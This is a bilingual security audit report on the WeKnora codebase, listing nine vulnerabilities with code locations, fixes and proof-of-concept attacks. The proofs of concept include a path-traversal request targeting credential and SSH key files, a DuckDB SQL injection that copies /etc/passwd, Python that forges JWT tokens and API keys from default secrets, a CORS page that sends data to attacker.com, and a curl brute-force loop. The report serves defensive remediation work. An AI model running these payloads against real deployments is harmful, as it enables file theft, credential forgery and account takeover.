# WeKnora 安全审计报告 / Security Audit Report

**日期**: 2026-02-26  
**版本**: v0.3.0  
**审计范围**: 完整代码库安全审查  

---

## 目录 / Table of Contents

1. [漏洞摘要 / Vulnerability Summary](#漏洞摘要)
2. [高危漏洞 / Critical Vulnerabilities](#高危漏洞)
3. [中危漏洞 / Medium Vulnerabilities](#中危漏洞)
4. [低危漏洞 / Low Vulnerabilities](#低危漏洞)
5. [修复建议 / Remediation Summary](#修复建议)

---

## 漏洞摘要

| 编号 | 漏洞名称 | 严重性 | CWE | 文件位置 |
|------|---------|--------|-----|---------|
| WK-001 | MCP Server 任意文件读取 | 🔴 高危 | CWE-22 | `mcp-server/weknora_mcp_server.py:131` |
| WK-002 | DuckDB SQL 注入 (文件名参数) | 🔴 高危 | CWE-89 | `internal/agent/tools/data_analysis.go:288,321` |
| WK-003 | 硬编码默认密钥 | 🔴 高危 | CWE-798 | `.env.example:86,93` |
| WK-004 | CORS 配置不当 | 🟡 中危 | CWE-942 | `internal/router/router.go:61` |
| WK-005 | API Key 明文存储与比较 | 🟡 中危 | CWE-256 | `internal/middleware/auth.go:176` |
| WK-006 | 认证端点缺少速率限制 | 🟡 中危 | CWE-307 | `internal/middleware/auth.go` |
| WK-007 | Docker Compose 默认凭据暴露 | 🟡 中危 | CWE-798 | `docker-compose.yml` |
| WK-008 | 缺少后端安全响应头 | 🟢 低危 | CWE-693 | `internal/router/router.go` |
| WK-009 | 弱密码策略 | 🟢 低危 | CWE-521 | `internal/handler/auth.go` |

---

## 高危漏洞

### WK-001: MCP Server 任意文件读取 (Arbitrary File Read)

**严重性**: 🔴 高危 (High)  
**CWE**: CWE-22 (Path Traversal)  
**CVSS 评估**: 7.5  

#### 漏洞描述

WeKnora MCP Server 的 `create_knowledge_from_file` 工具接受来自 MCP 客户端的 `file_path` 参数,  
直接使用 `open(file_path, "rb")` 打开文件，未做任何路径验证或限制。  
攻击者可通过 MCP 协议发送恶意文件路径，读取服务器上任意文件。

#### 漏洞代码位置

**文件**: `mcp-server/weknora_mcp_server.py`

```python
# 第 127-146 行
def create_knowledge_from_file(
    self, kb_id: str, file_path: str, enable_multimodel: bool = True
) -> Dict:
    """Create knowledge from a local file with optional multimodal processing"""
    with open(file_path, "rb") as f:  # ← 未验证 file_path，直接打开
        files = {"file": f}
        data = {"enable_multimodel": str(enable_multimodel).lower()}
        headers = self.session.headers.copy()
        del headers["Content-Type"]
        response = requests.post(
            f"{self.base_url}/knowledge-bases/{kb_id}/knowledge/file",
            headers=headers,
            files=files,
            data=data,
        )
        response.raise_for_status()
        return response.json()
```

**调用入口** (第 721-724 行):
```python
elif name == "create_knowledge_from_file":
    result = client.create_knowledge_from_file(
        args["kb_id"], args["file_path"], args.get("enable_multimodel", True)
    )
```

**工具定义** (第 376-393 行) — 无路径限制说明:
```python
types.Tool(
    name="create_knowledge_from_file",
    description="Create knowledge from a local file on the server filesystem",
    inputSchema={
        "type": "object",
        "properties": {
            "file_path": {
                "type": "string",
                "description": "Absolute path to the local file on the server",
            },
        },
        "required": ["kb_id", "file_path"],
    },
),
```

#### POC 验证

**前提条件**: MCP 客户端能够连接到 WeKnora MCP Server (通过 stdio 或 SSE 传输)。

```python
# POC: 通过 MCP 协议读取服务器敏感文件
import json

# MCP tool call 请求 (通过 MCP 客户端发送)
mcp_request = {
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tools/call",
    "params": {
        "name": "create_knowledge_from_file",
        "arguments": {
            "kb_id": "valid-knowledge-base-id",
            "file_path": "/etc/passwd"  # 读取系统密码文件
        }
    }
}

# 其他可利用的路径:
# "/etc/shadow"          - 密码哈希
# "/root/.ssh/id_rsa"    - SSH私钥
# "/proc/self/environ"   - 进程环境变量（可能包含 JWT_SECRET, AES_KEY）
# "/app/.env"            - 应用配置（包含数据库密码、密钥）
# "../../.env"           - 路径穿越读取配置
```

**预期结果**: 文件内容将被上传到知识库，攻击者随后可通过搜索或查看知识库内容获取文件内容。

#### 修复建议

```python
import os

ALLOWED_DIRECTORIES = ["/data/uploads", "/data/files"]

def create_knowledge_from_file(self, kb_id, file_path, enable_multimodel=True):
    # 1. 解析为绝对路径并规范化
    real_path = os.path.realpath(file_path)
    
    # 2. 检查是否在允许的目录内
    if not any(real_path.startswith(d) for d in ALLOWED_DIRECTORIES):
        raise ValueError(f"Access denied: {file_path} is outside allowed directories")
    
    # 3. 确保是普通文件（非符号链接、设备文件等）
    if not os.path.isfile(real_path):
        raise ValueError(f"Invalid file: {file_path}")
    
    with open(real_path, "rb") as f:
        # ... 原逻辑
```

---

### WK-002: DuckDB SQL 注入 (文件名参数)

**严重性**: 🔴 高危 (High)  
**CWE**: CWE-89 (SQL Injection)  
**CVSS 评估**: 7.2  

#### 漏洞描述

`DataAnalysisTool` 在创建 DuckDB 表时，将 `filename` 参数通过 `fmt.Sprintf` 直接拼接到 SQL 语句中。  
虽然 `tableName` 由系统生成（`k_` + UUID），但 `filename` 来自 `fileService.GetFileURL()` 返回的文件 URL。  
如果文件存储路径/URL 中包含单引号 `'`，将导致 SQL 注入。

此外，DuckDB 的 `read_csv_auto()` 和 `st_read()` 函数可读取任意文件路径，  
若 URL 可被控制，可导致**服务端本地文件读取**。

#### 漏洞代码位置

**文件**: `internal/agent/tools/data_analysis.go`

```go
// 第 286-294 行 - CSV 加载
func (t *DataAnalysisTool) LoadFromCSV(ctx context.Context, filename string, tableName string) (*TableSchema, error) {
    if t.recordCreatedTable(tableName) {
        // ← filename 直接拼接，未做转义
        createTableSQL := fmt.Sprintf("CREATE TABLE \"%s\" AS SELECT * FROM read_csv_auto('%s')", tableName, filename)
        _, err := t.db.ExecContext(ctx, createTableSQL)
        // ...
    }
    return t.LoadFromTable(ctx, tableName)
}

// 第 318-328 行 - Excel 加载
func (t *DataAnalysisTool) LoadFromExcel(ctx context.Context, filename string, tableName string) (*TableSchema, error) {
    if t.recordCreatedTable(tableName) {
        // ← 同样的问题
        createTableSQL := fmt.Sprintf("CREATE TABLE \"%s\" AS SELECT * FROM st_read('%s')", tableName, filename)
        _, err := t.db.ExecContext(ctx, createTableSQL)
        // ...
    }
    return t.LoadFromTable(ctx, tableName)
}
```

**数据流追溯**:
```
LoadFromKnowledgeID() (L383-391)
  → GetKnowledgeByIDOnly()      // 从数据库获取 Knowledge
  → LoadFromKnowledge() (L345-371)
    → fileService.GetFileURL()  // 获取文件URL/路径
    → LoadFromCSV(fileURL, ...)  // fileURL 直接拼接到SQL
```

同样的问题存在于 `internal/application/service/extract.go` 第 395 行:
```go
Sql: fmt.Sprintf("SELECT * FROM \"%s\" LIMIT 10", tableSchema.TableName),
```

#### POC 验证

**攻击场景**: 当使用本地文件存储且文件路径包含特殊字符时，或文件存储服务返回的 URL 可被控制时。

```
# 场景 1: 如果 filename 可被控制为
filename = "'); COPY (SELECT * FROM read_csv_auto('/etc/passwd')) TO '/tmp/exfil.csv'; --"

# 最终执行的 SQL:
# CREATE TABLE "k_xxx" AS SELECT * FROM read_csv_auto(''); 
# COPY (SELECT * FROM read_csv_auto('/etc/passwd')) TO '/tmp/exfil.csv'; --')

# 场景 2: DuckDB 文件读取
# 如果 filename 参数可被指定为任意路径
filename = "/etc/passwd"
# 将执行: CREATE TABLE "k_xxx" AS SELECT * FROM read_csv_auto('/etc/passwd')
# 系统文件内容将被加载到 DuckDB 表中
```

**注意**: 该漏洞的可利用性取决于 `fileService.GetFileURL()` 的返回值是否可被攻击者间接控制。  
在当前实现中，本地存储返回文件系统路径，云存储返回预签名 URL。  
若攻击者可以控制上传文件的原始名称且名称未被完全替换（尽管当前实现使用 UUID 重命名），仍存在潜在风险。

#### 修复建议

```go
// 转义单引号以防止SQL注入
func sanitizeFilenameForSQL(filename string) string {
    return strings.ReplaceAll(filename, "'", "''")
}

func (t *DataAnalysisTool) LoadFromCSV(ctx context.Context, filename string, tableName string) (*TableSchema, error) {
    if t.recordCreatedTable(tableName) {
        safeFilename := sanitizeFilenameForSQL(filename)
        createTableSQL := fmt.Sprintf("CREATE TABLE \"%s\" AS SELECT * FROM read_csv_auto('%s')", tableName, safeFilename)
        _, err := t.db.ExecContext(ctx, createTableSQL)
        // ...
    }
    return t.LoadFromTable(ctx, tableName)
}
```

---

### WK-003: 硬编码默认密钥

**严重性**: 🔴 高危 (High)  
**CWE**: CWE-798 (Use of Hard-coded Credentials)  
**CVSS 评估**: 8.1  

#### 漏洞描述

`.env.example` 中包含可预测的默认密钥值。由于该文件是部署参考模板，  
大量用户可能直接复制为 `.env` 而不修改这些值，导致所有实例使用相同的密钥。

#### 漏洞代码位置

**文件**: `.env.example`

```bash
# 第 86 行 - 租户 API Key 加密密钥
TENANT_AES_KEY=weknorarag-api-key-secret-secret
# ↑ 固定的 AES 密钥，任何攻击者都能用它伪造 API Key

# 第 93 行 - JWT 签名密钥
JWT_SECRET=weknora-jwt-secret
# ↑ 固定的 JWT 密钥，任何攻击者都能伪造任意用户的 JWT Token

# 第 62 行 - 数据库密码
DB_PASSWORD=postgres123!@#

# 第 72 行 - Redis 密码
REDIS_PASSWORD=redis123!@#
```

**密钥使用位置**:

`internal/application/service/user.go` 第 30-44 行:
```go
func getJwtSecret() string {
    jwtSecretOnce.Do(func() {
        if envSecret := strings.TrimSpace(os.Getenv("JWT_SECRET")); envSecret != "" {
            jwtSecret = envSecret  // ← 使用环境变量中的默认值
        } else {
            // 回退到随机生成（但重启后失效）
            randomBytes := make([]byte, 32)
            rand.Read(randomBytes)
            jwtSecret = base64.StdEncoding.EncodeToString(randomBytes)
        }
    })
    return jwtSecret
}
```

#### POC 验证

```python
# POC: 使用默认 JWT_SECRET 伪造管理员 Token
import jwt
import time

# 默认密钥（来自 .env.example）
JWT_SECRET = "weknora-jwt-secret"

# 伪造任意用户的 JWT Token
forged_token = jwt.encode({
    "user_id": "admin-user-id",      # 管理员用户ID
    "email": "admin@example.com",
    "tenant_id": 1,
    "type": "access",
    "exp": int(time.time()) + 86400,  # 24小时有效
    "iat": int(time.time()),
}, JWT_SECRET, algorithm="HS256")

print(f"Forged Token: {forged_token}")

# 使用伪造Token访问管理接口
import requests
headers = {"Authorization": f"Bearer {forged_token}"}
response = requests.get("http://target:8080/api/v1/tenants", headers=headers)
print(response.json())
```

```python
# POC: 使用默认 TENANT_AES_KEY 伪造 API Key
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64
import os
import struct

TENANT_AES_KEY = b"weknorarag-api-key-secret-secret"  # 32 bytes

# 伪造租户 ID=1 的 API Key
tenant_id = 1
plaintext = str(tenant_id).encode()
nonce = os.urandom(12)
aesgcm = AESGCM(TENANT_AES_KEY)
ciphertext = aesgcm.encrypt(nonce, plaintext, None)
api_key = "sk-" + base64.urlsafe_b64encode(nonce + ciphertext).decode()

print(f"Forged API Key: {api_key}")

# 使用伪造 API Key 访问所有接口
headers = {"X-API-Key": api_key}
response = requests.get("http://target:8080/api/v1/knowledge-bases", headers=headers)
```

#### 修复建议

1. `.env.example` 中使用占位符而非实际值:
```bash
JWT_SECRET=<CHANGE_ME_TO_RANDOM_64_CHAR_STRING>
TENANT_AES_KEY=<CHANGE_ME_TO_RANDOM_32_CHAR_STRING>
DB_PASSWORD=<CHANGE_ME>
```

2. 应用启动时检测并拒绝使用默认密钥:
```go
func validateSecrets() error {
    weakSecrets := []string{"weknora-jwt-secret", "weknorarag-api-key-secret-secret"}
    if slices.Contains(weakSecrets, os.Getenv("JWT_SECRET")) {
        return fmt.Errorf("CRITICAL: JWT_SECRET is set to a known default value, please change it")
    }
    return nil
}
```

---

## 中危漏洞

### WK-004: CORS 配置不当

**严重性**: 🟡 中危 (Medium)  
**CWE**: CWE-942 (Permissive Cross-domain Policy)  

#### 漏洞描述

后端 CORS 配置使用 `AllowOrigins: ["*"]` 同时设置 `AllowCredentials: true`。  
这违反了 CORS 规范，可能导致跨域凭据泄露。

#### 漏洞代码位置

**文件**: `internal/router/router.go` 第 60-67 行

```go
r.Use(cors.New(cors.Config{
    AllowOrigins:     []string{"*"},       // ← 允许所有来源
    AllowMethods:     []string{"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"},
    AllowHeaders:     []string{"Origin", "Content-Type", "Accept", "Authorization", "X-API-Key", "X-Request-ID"},
    ExposeHeaders:    []string{"Content-Length", "Access-Control-Allow-Origin"},
    AllowCredentials: true,                // ← 同时允许携带凭据
    MaxAge:           12 * time.Hour,
}))
```

#### POC 验证

```html
<!-- 恶意网站上的 POC 页面 -->
<html>
<body>
<script>
// 从任意域发起带凭据的请求
// 注: gin-contrib/cors v1.7.5 在 AllowOrigins=* 时会将响应头
// Access-Control-Allow-Origin 设置为请求的 Origin，而非 *
fetch('http://target:8080/api/v1/knowledge-bases', {
    credentials: 'include',
    headers: {
        'Authorization': 'Bearer ' + document.cookie.match(/token=([^;]+)/)?.[1]
    }
})
.then(r => r.json())
.then(data => {
    // 将窃取的数据发送到攻击者服务器
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
</body>
</html>
```

**注意**: `gin-contrib/cors v1.7.5` 在 `AllowOrigins: ["*"]` 且 `AllowCredentials: true` 时，  
会将 `Access-Control-Allow-Origin` 设置为请求中的 `Origin` 值而非通配符 `*`，  
这意味着任何域都可以携带凭据访问 API。

#### 修复建议

```go
r.Use(cors.New(cors.Config{
    AllowOrigins:     []string{"https://yourdomain.com", "https://app.yourdomain.com"},
    AllowCredentials: true,
    // ... 其他配置不变
}))
```

---

### WK-005: API Key 明文存储与比较

**严重性**: 🟡 中危 (Medium)  
**CWE**: CWE-256 (Plaintext Storage of a Password)  

#### 漏洞描述

API Key 在数据库中以明文存储，认证时使用直接字符串比较。  
如果数据库被泄露（SQL 注入、备份泄露、内部人员等），所有租户的 API Key 将直接暴露。

#### 漏洞代码位置

**文件**: `internal/middleware/auth.go` 第 176 行

```go
if t == nil || t.APIKey != apiKey {  // ← 明文直接比较
    c.JSON(http.StatusUnauthorized, gin.H{
        "error": "Unauthorized: invalid API key",
    })
    c.Abort()
    return
}
```

#### 修复建议

使用 bcrypt 或 SHA-256 哈希存储 API Key：
```go
// 存储时
hashedKey := sha256.Sum256([]byte(apiKey))
// 比较时
if !hmac.Equal(hashedKey[:], storedHash) { ... }
```

---

### WK-006: 认证端点缺少速率限制

**严重性**: 🟡 中危 (Medium)  
**CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)  

#### 漏洞描述

登录、注册、Token 刷新等认证端点没有任何速率限制，  
攻击者可以进行无限制的暴力破解或凭据填充攻击。

#### 漏洞代码位置

**文件**: `internal/middleware/auth.go` — 无速率限制中间件  
**文件**: `internal/router/router.go` — 路由组无速率限制配置

```go
// 无需认证的API — 无任何速率限制保护
var noAuthAPI = map[string][]string{
    "/health":               {"GET"},
    "/api/v1/auth/register": {"POST"},  // ← 无限注册
    "/api/v1/auth/login":    {"POST"},  // ← 无限登录尝试
    "/api/v1/auth/refresh":  {"POST"},  // ← 无限刷新
}
```

#### POC 验证

```bash
# 暴力破解登录接口 - 无限制
for password in $(cat passwords.txt); do
    curl -s -X POST http://target:8080/api/v1/auth/login \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"admin@example.com\",\"password\":\"$password\"}" &
done
# 不会被限制或封禁
```

#### 修复建议

添加速率限制中间件（基于 IP 或账户）：
```go
// 使用 golang.org/x/time/rate 或 Redis 实现
func RateLimitMiddleware(limit int, window time.Duration) gin.HandlerFunc {
    // 每个 IP 每分钟最多 limit 次请求
}
```

---

### WK-007: Docker Compose 默认凭据暴露

**严重性**: 🟡 中危 (Medium)  
**CWE**: CWE-798 (Hard-coded Credentials)  

#### 漏洞描述

`docker-compose.yml` 中包含默认凭据和暴露的管理端口，  
如果直接用于生产部署，将导致外部服务被未授权访问。

#### 漏洞代码位置

**文件**: `docker-compose.yml`

```yaml
# MinIO 默认管理凭据
minio:
  environment:
    MINIO_ROOT_USER: minioadmin          # ← 默认凭据
    MINIO_ROOT_PASSWORD: minioadmin      # ← 默认凭据
  ports:
    - "${MINIO_PORT:-9000}:9000"
    - "${MINIO_CONSOLE_PORT:-9001}:9001"  # ← 管理控制台暴露

# Neo4j 默认凭据
neo4j:
  environment:
    NEO4J_AUTH: neo4j/password           # ← 默认凭据
  ports:
    - "7474:7474"                        # ← Web UI 暴露
    - "7687:7687"

# Jaeger UI 暴露（无认证）
jaeger:
  ports:
    - "16686:16686"                      # ← 跟踪数据泄露

# Qdrant 向量数据库暴露
qdrant:
  ports:
    - "${QDRANT_REST_PORT:-6333}:6333"   # ← REST API 暴露
```

---

## 低危漏洞

### WK-008: 缺少后端安全响应头

**严重性**: 🟢 低危 (Low)  
**CWE**: CWE-693 (Protection Mechanism Failure)  

#### 漏洞描述

Go 后端 API 响应缺少关键安全头，增加了 XSS、点击劫持等攻击风险。

前端 Nginx 配置了部分安全头 (`frontend/nginx.conf`)，但后端 API 完全缺失。

#### 缺失的安全头

| 安全头 | 状态 | 风险 |
|--------|------|------|
| `Content-Security-Policy` | ❌ 缺失 | XSS 攻击 |
| `Strict-Transport-Security` | ❌ 缺失 | 中间人攻击 |
| `Permissions-Policy` | ❌ 缺失 | 功能滥用 |
| `X-Frame-Options` | 仅前端 | 点击劫持 |
| `X-Content-Type-Options` | 仅前端 | MIME 嗅探 |

#### 修复建议

```go
func SecurityHeaders() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("X-Content-Type-Options", "nosniff")
        c.Header("X-Frame-Options", "DENY")
        c.Header("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        c.Header("Content-Security-Policy", "default-src 'self'")
        c.Header("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
        c.Next()
    }
}
```

---

### WK-009: 弱密码策略

**严重性**: 🟢 低危 (Low)  
**CWE**: CWE-521 (Weak Password Requirements)  

#### 漏洞描述

用户注册和修改密码时，仅要求最少 6 个字符，无复杂性要求。

#### 漏洞代码位置

**文件**: `internal/handler/auth.go`

密码验证仅检查最小长度，不要求包含大写字母、数字、特殊字符等。

#### 修复建议

```go
func validatePassword(password string) error {
    if len(password) < 8 { return errors.New("password must be at least 8 characters") }
    if !regexp.MustCompile(`[A-Z]`).MatchString(password) { return errors.New("must contain uppercase") }
    if !regexp.MustCompile(`[0-9]`).MatchString(password) { return errors.New("must contain digit") }
    if !regexp.MustCompile(`[!@#$%^&*]`).MatchString(password) { return errors.New("must contain special char") }
    return nil
}
```

---

## 修复建议

### 优先级排序

| 优先级 | 漏洞编号 | 修复措施 | 预计工作量 |
|--------|---------|---------|-----------|
| P0 紧急 | WK-001 | MCP Server 添加文件路径白名单验证 | 0.5 天 |
| P0 紧急 | WK-003 | 替换默认密钥为占位符，添加启动时校验 | 0.5 天 |
| P1 高优 | WK-002 | DuckDB SQL 语句参数转义 | 0.5 天 |
| P1 高优 | WK-004 | 配置具体的允许来源域名 | 0.5 天 |
| P2 中优 | WK-005 | API Key 哈希存储 | 1 天 |
| P2 中优 | WK-006 | 添加认证接口速率限制 | 1 天 |
| P2 中优 | WK-007 | 修改 Docker Compose 默认凭据 | 0.5 天 |
| P3 低优 | WK-008 | 添加安全响应头中间件 | 0.5 天 |
| P3 低优 | WK-009 | 增强密码复杂度要求 | 0.5 天 |

---

### 安全防护现状 (正面评价)

审计中也发现了多项良好的安全实践:

- ✅ **SSRF 防护**: `IsSSRFSafeURL()` 实现了全面的 SSRF 防护（DNS 重绑定、IP 混淆、元数据端点阻止等）
- ✅ **SQL 验证**: `ValidateSQL()` 使用 PostgreSQL AST 解析器进行深度 SQL 验证
- ✅ **沙箱隔离**: Docker 沙箱具备严格的安全配置（非 root、能力删除、只读文件系统）
- ✅ **XSS 防护**: 具备输入清理和 HTML 编码功能
- ✅ **路径安全**: 文件上传使用 UUID 重命名，避免路径穿越
- ✅ **密码存储**: 使用 bcrypt 进行密码哈希（行业最佳实践）
- ✅ **参数化查询**: 数据库层一致使用 GORM 参数化查询防止 SQL 注入
- ✅ **命令白名单**: 沙箱脚本执行使用命令白名单和恶意模式检测
